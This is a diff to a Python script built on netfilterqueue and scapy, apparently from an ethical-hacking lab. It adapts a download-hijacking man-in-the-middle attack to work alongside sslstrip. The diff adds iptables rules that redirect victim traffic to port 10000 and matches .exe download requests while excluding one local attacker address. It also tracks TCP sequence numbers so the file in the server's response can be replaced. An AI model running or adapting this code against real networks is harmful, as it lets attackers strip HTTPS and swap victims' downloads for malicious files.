@@ -7,6 +7,11 @@
 # iptables -I INPUT -j NFQUEUE --queue-num 0
 # iptables --flush
 
+# Targeting a remote computer using sslstrip 
+# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+# iptables -I OUTPUT -j NFQUEUE --queue-num 0
+# iptables -I INPUT -j NFQUEUE --queue-num 0
+# iptables --flush
 
 import netfilterqueue
 import scapy.all as sc
@@ -25,12 +30,14 @@ def set_load(packet, load):
 def process_packet(packet):
     scapy_packet = sc.IP(packet.get_payload())
     if scapy_packet.haslayer(sc.Raw):
-        if scapy_packet[sc.TCP].dport == 80:
+        # if scapy_packet[sc.TCP].dport == 80:
+        if scapy_packet[sc.TCP].dport == 10000: # sslstrip
             load = scapy_packet[sc.Raw].load
-            if bytes('.exe', 'utf-8') in load:
+            if bytes('.exe', 'utf-8') in load and bytes('10.0.2.13', 'utf-8') not in load:
                 print(f'[+] exe Request > {load}')
                 ack_list.append(scapy_packet[sc.TCP].ack)
-        if scapy_packet[sc.TCP].sport == 80:
+        # if scapy_packet[sc.TCP].sport == 80:
+        if scapy_packet[sc.TCP].sport == 10000: # sslstrip
             if scapy_packet[sc.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[sc.TCP].seq)
                 load = scapy_packet[sc.Raw].load
